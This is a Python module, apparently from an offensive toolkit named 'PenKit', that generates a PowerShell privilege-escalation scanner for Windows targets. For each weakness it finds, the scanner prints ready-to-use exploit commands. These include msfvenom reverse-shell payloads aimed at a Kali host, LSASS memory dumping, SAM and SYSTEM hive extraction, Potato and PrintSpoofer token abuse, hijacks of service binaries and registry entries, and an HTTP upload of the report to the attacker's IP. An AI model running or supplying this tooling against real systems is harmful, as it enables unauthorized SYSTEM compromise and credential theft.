"""
Auto-PrivEsc Scanner — findet automatisch alle ausnutzbaren Privilege-Escalation-Vektoren.

Generiert ein PowerShell-Skript das auf dem Ziel-Windows läuft und 15+ Vektoren prüft.
Für jeden gefundenen Vektor: fertiger Exploit-Befehl wird direkt angezeigt.

Geprüfte Vektoren:
  1.  AlwaysInstallElevated     — MSI als SYSTEM installieren
  2.  Unquoted Service Paths    — DLL in Zwischenverzeichnis platzieren
  3.  Weak Service Permissions  — Service-Binary ersetzen
  4.  Weak Registry Permissions — Service-Pfad in Registry ändern
  5.  Writeable PATH Dirs       — DLL Hijacking in System-PATH
  6.  UAC Level                 — Bypass-Methode empfehlen
  7.  SeImpersonatePrivilege    — Juicy/Sweet Potato / PrintSpoofer
  8.  SeBackupPrivilege         — SAM/SYSTEM direkt lesen
  9.  SeDebugPrivilege          — LSASS Dump / Token Steal
  10. Scheduled Tasks (writeable) — Task-Binary ersetzen
  11. DLL Hijacking (known)     — bekannte anfällige Pfade
  12. AutoRuns                  — schwache Autostart-Einträge
  13. PrintSpooler              — PrintNightmare (CVE-2021-34527)
  14. Stored Credentials        — cmdkey, WiFi, DPAPI Blobs
  15. WSL                       — Dateisystem-Escape via /mnt/c
"""

from __future__ import annotations


def generate_scanner_ps1(kali_ip: str = "", report_path: str = r"C:\Windows\Temp\privesc.txt") -> str:
    """
    Vollständiger Auto-PrivEsc Scanner als PowerShell-Script.
    Gibt für jeden gefundenen Vektor einen fertigen Exploit-Befehl aus.
    """
    tg_note = ""
    if kali_ip:
        tg_note = f"""
# Ergebnis an Kali senden (wenn HTTP-Server läuft):
# Invoke-WebRequest -Uri http://{kali_ip}:8080/upload -Method POST -InFile "{report_path}"
"""

    return f"""# ╔══════════════════════════════════════════════════════════╗
# ║   PenKit Auto-PrivEsc Scanner                            ║
# ║   Prüft 15+ Vektoren, zeigt fertige Exploit-Befehle      ║
# ╚══════════════════════════════════════════════════════════╝

$report = @()
$found  = 0

function Check($label, $exploit, $detail = "") {{
    Write-Host "[!] GEFUNDEN: $label" -ForegroundColor Red
    if ($detail) {{ Write-Host "    Detail:  $detail" -ForegroundColor Yellow }}
    Write-Host "    Exploit: $exploit" -ForegroundColor Cyan
    Write-Host ""
    $script:found++
    $script:report += "[GEFUNDEN] $label"
    if ($detail)  {{ $script:report += "  Detail:  $detail" }}
    $script:report += "  Exploit: $exploit"
    $script:report += ""
}}

function Info($msg) {{
    Write-Host "[*] $msg" -ForegroundColor DarkGray
}}

Write-Host ""
Write-Host "╔══════════════════════════════════════════════╗" -ForegroundColor Magenta
Write-Host "║  PenKit Auto-PrivEsc Scanner                 ║" -ForegroundColor Magenta
Write-Host "╚══════════════════════════════════════════════╝" -ForegroundColor Magenta
Write-Host ""
Write-Host "[*] Benutzer:  $(whoami)"
Write-Host "[*] Hostname:  $env:COMPUTERNAME"
Write-Host "[*] OS:        $([System.Environment]::OSVersion.VersionString)"
Write-Host ""

# ── 1. AlwaysInstallElevated ──────────────────────────────────────────────────
Info "Prüfe AlwaysInstallElevated..."
$aie1 = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aie2 = (Get-ItemProperty "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($aie1 -eq 1 -and $aie2 -eq 1) {{
    Check "AlwaysInstallElevated" `
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi -o evil.msi && msiexec /quiet /i evil.msi" `
        "MSI-Pakete werden als SYSTEM installiert"
}}

# ── 2. Unquoted Service Paths ─────────────────────────────────────────────────
Info "Prüfe Unquoted Service Paths..."
$svcs = Get-WmiObject -Class Win32_Service | Where-Object {{
    $_.PathName -notmatch '"' -and $_.PathName -match ' ' -and $_.PathName -notmatch '^C:\\\\Windows'
}}
foreach ($s in $svcs) {{
    $path = $s.PathName
    # Prüfe ob ein Zwischen-Verzeichnis beschreibbar ist
    $parts = $path -split ' '
    $partial = ""
    foreach ($p in $parts[0..($parts.Count-2)]) {{
        $partial += $p
        $dir = Split-Path $partial -Parent
        if ($dir -and (Test-Path $dir)) {{
            $acl = Get-Acl $dir -ErrorAction SilentlyContinue
            $writable = $acl.Access | Where-Object {{ $_.FileSystemRights -match "Write|FullControl" -and $_.IdentityReference -match "Everyone|Users|Authenticated" }}
            if ($writable) {{
                Check "Unquoted Service Path: $($s.Name)" `
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o '$partial.exe'; net stop $($s.Name); net start $($s.Name)" `
                    "Pfad: $path | Beschreibbar: $dir"
            }}
        }}
        $partial += " "
    }}
}}

# ── 3. Weak Service Permissions ───────────────────────────────────────────────
Info "Prüfe schwache Service-Berechtigungen..."
Get-WmiObject -Class Win32_Service | ForEach-Object {{
    $svc = $_
    $binPath = $svc.PathName -replace '"', '' -replace ' .*', ''
    if ($binPath -and (Test-Path $binPath -ErrorAction SilentlyContinue)) {{
        $acl = Get-Acl $binPath -ErrorAction SilentlyContinue
        $w = $acl.Access | Where-Object {{ $_.FileSystemRights -match "FullControl|Modify|Write" -and $_.IdentityReference -match "Everyone|Users|Authenticated" }}
        if ($w) {{
            Check "Weak Service Binary: $($svc.Name)" `
                "copy evil.exe '$binPath'; sc stop $($svc.Name); sc start $($svc.Name)" `
                "Binary: $binPath | Berechtigung: $($w[0].IdentityReference) → $($w[0].FileSystemRights)"
        }}
    }}
}}

# ── 4. Weak Registry Service Permissions ─────────────────────────────────────
Info "Prüfe schwache Registry-Berechtigungen (Services)..."
$services = Get-ChildItem "HKLM:\\SYSTEM\\CurrentControlSet\\Services" -ErrorAction SilentlyContinue
foreach ($s in $services) {{
    $acl = Get-Acl $s.PSPath -ErrorAction SilentlyContinue
    $w = $acl.Access | Where-Object {{ $_.RegistryRights -match "FullControl|WriteKey|SetValue" -and $_.IdentityReference -match "Everyone|Users|Authenticated" }}
    if ($w) {{
        Check "Weak Service Registry: $($s.PSChildName)" `
            "Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$($s.PSChildName)' -Name ImagePath -Value 'C:\\Windows\\Temp\\evil.exe'; sc stop $($s.PSChildName); sc start $($s.PSChildName)" `
            "Schlüssel: $($s.PSPath)"
    }}
}}

# ── 5. Writeable Directories in %PATH% ────────────────────────────────────────
Info "Prüfe beschreibbare PATH-Verzeichnisse (DLL Hijacking)..."
$pathDirs = $env:PATH -split ";"
foreach ($d in $pathDirs) {{
    if ($d -and (Test-Path $d -ErrorAction SilentlyContinue)) {{
        try {{
            $testFile = "$d\\.penkit_test_$([System.Guid]::NewGuid().ToString('N')[0..7] -join '')"
            [System.IO.File]::Create($testFile).Close()
            Remove-Item $testFile -Force
            Check "Writeable PATH Dir: $d" `
                "# DLL Hijacking: bekannte DLL in $d platzieren (z.B. wlbsctrl.dll, cscapi.dll)" `
                "Platziere evil.dll mit dem richtigen Namen → wird von Prozessen im PATH geladen"
        }} catch {{ }}
    }}
}}

# ── 6. UAC Level ──────────────────────────────────────────────────────────────
Info "Prüfe UAC-Konfiguration..."
$uacKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
$uacLevel = (Get-ItemProperty $uacKey -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin
$luaOn    = (Get-ItemProperty $uacKey -ErrorAction SilentlyContinue).EnableLUA
if ($luaOn -eq 0 -or $uacLevel -eq 0) {{
    Check "UAC Deaktiviert" `
        "# Kein Bypass nötig — bereits elevated" `
        "EnableLUA=$luaOn, Level=$uacLevel"
}} elseif ($uacLevel -le 2) {{
    $build = [System.Environment]::OSVersion.Version.Build
    $method = if ($build -ge 22000) {{ "computerdefaults / fodhelper" }} elseif ($build -ge 17763) {{ "sdclt / computerdefaults" }} else {{ "eventvwr / cmstp" }}
    Check "UAC Bypassbar (Level $uacLevel)" `
        "# Empfohlen: $method (PenKit → C2 → UAC Bypass → Option $method)" `
        "Windows Build: $build"
}}

# ── 7. Gefährliche Token-Rechte ───────────────────────────────────────────────
Info "Prüfe Token-Privilegien..."
$privs = whoami /priv 2>$null

if ($privs -match "SeImpersonatePrivilege.*Enabled|SeImpersonatePrivilege.*Aktiviert") {{
    $build = [System.Environment]::OSVersion.Version.Build
    $tool = if ($build -ge 17763) {{ "PrintSpoofer64.exe -i -c cmd.exe" }} else {{ "JuicyPotato.exe -l 1337 -p cmd.exe -t *" }}
    Check "SeImpersonatePrivilege" `
        $tool `
        "Service/IIS Account → SYSTEM via Potato-Angriff"
}}

if ($privs -match "SeBackupPrivilege.*Enabled|SeBackupPrivilege.*Aktiviert") {{
    Check "SeBackupPrivilege" `
        "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv; reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv" `
        "SAM/SYSTEM Hive direkt lesen → alle lokalen Passwort-Hashes"
}}

if ($privs -match "SeDebugPrivilege.*Enabled|SeDebugPrivilege.*Aktiviert") {{
    Check "SeDebugPrivilege" `
        "rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump $(Get-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full" `
        "LSASS Dump möglich → alle Passwörter/Hashes"
}}

if ($privs -match "SeTakeOwnershipPrivilege.*Enabled|SeTakeOwnershipPrivilege.*Aktiviert") {{
    Check "SeTakeOwnershipPrivilege" `
        "takeown /f C:\\Windows\\System32\\cmd.exe; icacls C:\\Windows\\System32\\cmd.exe /grant Everyone:F" `
        "Beliebige Dateien übernehmen → System-Binaries ersetzen"
}}

if ($privs -match "SeLoadDriverPrivilege.*Enabled|SeLoadDriverPrivilege.*Aktiviert") {{
    Check "SeLoadDriverPrivilege" `
        "# BYOVD: eigenen Kernel-Treiber laden (z.B. capcom.sys) → Kernel-Code ausführen" `
        "Kernel-Level Code Execution möglich"
}}

# ── 8. PrintSpooler (PrintNightmare) ─────────────────────────────────────────
Info "Prüfe PrintSpooler (PrintNightmare)..."
$spooler = Get-Service -Name Spooler -ErrorAction SilentlyContinue
$build   = [System.Environment]::OSVersion.Version.Build
if ($spooler -and $spooler.Status -eq "Running" -and $build -lt 19041) {{
    Check "PrintNightmare (CVE-2021-34527)" `
        "# Metasploit: use exploit/windows/local/cve_2021_34527_printnightmare" `
        "PrintSpooler läuft, Build $build (möglicherweise ungepatcht)"
}}

# ── 9. Scheduled Tasks (writeable binary) ────────────────────────────────────
Info "Prüfe Scheduled Tasks..."
$tasks = schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv -ErrorAction SilentlyContinue
foreach ($t in $tasks) {{
    $run = $t."Task To Run"
    if ($run -and $run -ne "COM handler" -and (Test-Path $run -ErrorAction SilentlyContinue)) {{
        $acl = Get-Acl $run -ErrorAction SilentlyContinue
        $w = $acl.Access | Where-Object {{ $_.FileSystemRights -match "FullControl|Modify|Write" -and $_.IdentityReference -match "Everyone|Users|Authenticated" }}
        if ($w) {{
            $taskName = $t.TaskName
            Check "Writeable Task Binary: $taskName" `
                "copy evil.exe '$run' /y  # wartet bis Task ausgeführt wird" `
                "Task: $taskName | Binary: $run"
        }}
    }}
}}

# ── 10. AutoRuns (schwache Berechtigungen) ────────────────────────────────────
Info "Prüfe AutoRun-Einträge..."
$runKeys = @(
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
)
foreach ($key in $runKeys) {{
    if (Test-Path $key) {{
        Get-ItemProperty $key -ErrorAction SilentlyContinue | ForEach-Object {{
            $_.PSObject.Properties | Where-Object {{ $_.Name -notmatch "^PS" }} | ForEach-Object {{
                $binPath = $_.Value -replace '"', '' -replace ' .*', ''
                if ($binPath -and (Test-Path $binPath -ErrorAction SilentlyContinue)) {{
                    $acl = Get-Acl $binPath -ErrorAction SilentlyContinue
                    $w = $acl.Access | Where-Object {{ $_.FileSystemRights -match "FullControl|Modify|Write" -and $_.IdentityReference -match "Everyone|Users|Authenticated" }}
                    if ($w) {{
                        Check "Writeable AutoRun: $($_.Name)" `
                            "copy evil.exe '$binPath' /y  # beim nächsten Login ausgeführt" `
                            "Key: $key | Binary: $binPath"
                    }}
                }}
            }}
        }}
    }}
}}

# ── 11. Stored Credentials ────────────────────────────────────────────────────
Info "Prüfe gespeicherte Credentials..."
$creds = cmdkey /list 2>$null
if ($creds -match "Target") {{
    Check "Stored Credentials (cmdkey)" `
        'runas /savecred /user:DOMAIN\\admin "cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt"' `
        ($creds | Select-String "Target" | Select-Object -First 3 | Out-String).Trim()
}}

# ── 12. WSL / Windows Subsystem for Linux ────────────────────────────────────
Info "Prüfe WSL..."
if (Get-Command wsl -ErrorAction SilentlyContinue) {{
    $wslStatus = wsl --status 2>$null
    Check "WSL installiert" `
        "wsl -u root  # oder: wsl bash -c 'cat /mnt/c/Windows/System32/config/SAM'" `
        "WSL kann auf Windows-Dateisystem zugreifen → SAM lesen wenn root in WSL"
}}

# ── 13. DLL Hijacking (bekannte anfällige Programme) ─────────────────────────
Info "Prüfe bekannte DLL Hijacking-Ziele..."
$dllHijackTargets = @(
    @{{path="C:\\Program Files\\VLC\\vlc.exe"; dll="wlbsctrl.dll"}},
    @{{path="C:\\Program Files\\7-Zip\\7z.exe"; dll="7-zip.dll"}},
    @{{path="C:\\Python*\\python.exe"; dll="python3.dll"}}
)
foreach ($t in $dllHijackTargets) {{
    $matches = Resolve-Path $t.path -ErrorAction SilentlyContinue
    foreach ($m in $matches) {{
        $dir = Split-Path $m -Parent
        $acl = Get-Acl $dir -ErrorAction SilentlyContinue
        $w = $acl.Access | Where-Object {{ $_.FileSystemRights -match "FullControl|Modify|Write" -and $_.IdentityReference -match "Everyone|Users|Authenticated" }}
        if ($w) {{
            Check "DLL Hijacking: $($t.dll) in $dir" `
                "# evil.dll → $dir\\$($t.dll)" `
                "Programm: $m"
        }}
    }}
}}

# ── Zusammenfassung ───────────────────────────────────────────────────────────
Write-Host "═" * 50 -ForegroundColor Magenta
Write-Host "[*] Scan abgeschlossen." -ForegroundColor Magenta
if ($found -gt 0) {{
    Write-Host "[!] $found Vektoren gefunden!" -ForegroundColor Red
    Write-Host "[*] Report: {report_path}" -ForegroundColor Yellow
}} else {{
    Write-Host "[+] Keine offensichtlichen Vektoren — system ist gut gehärtet." -ForegroundColor Green
}}
Write-Host "═" * 50 -ForegroundColor Magenta

$report | Set-Content "{report_path}"
{tg_note}"""


def quick_check_ps1() -> str:
    """Kurzer One-Liner Check — zeigt sofort die wichtigsten Punkte."""
    return r"""# Quick PrivEsc Check (One-Liner):
echo "=== TOKEN PRIVS ==="; whoami /priv | Select-String "Enabled|Aktiviert"
echo "=== UAC LEVEL ==="; (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System').ConsentPromptBehaviorAdmin
echo "=== AlwaysInstallElevated ==="; (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -EA SilentlyContinue).AlwaysInstallElevated
echo "=== UNQUOTED SERVICES ==="; Get-WmiObject Win32_Service | Where-Object{$_.PathName -notmatch '"' -and $_.PathName -match ' ' -and $_.PathName -notmatch 'C:\Windows'} | Select Name,PathName
echo "=== PRINTSPOOLER ==="; Get-Service Spooler | Select Name,Status
"""
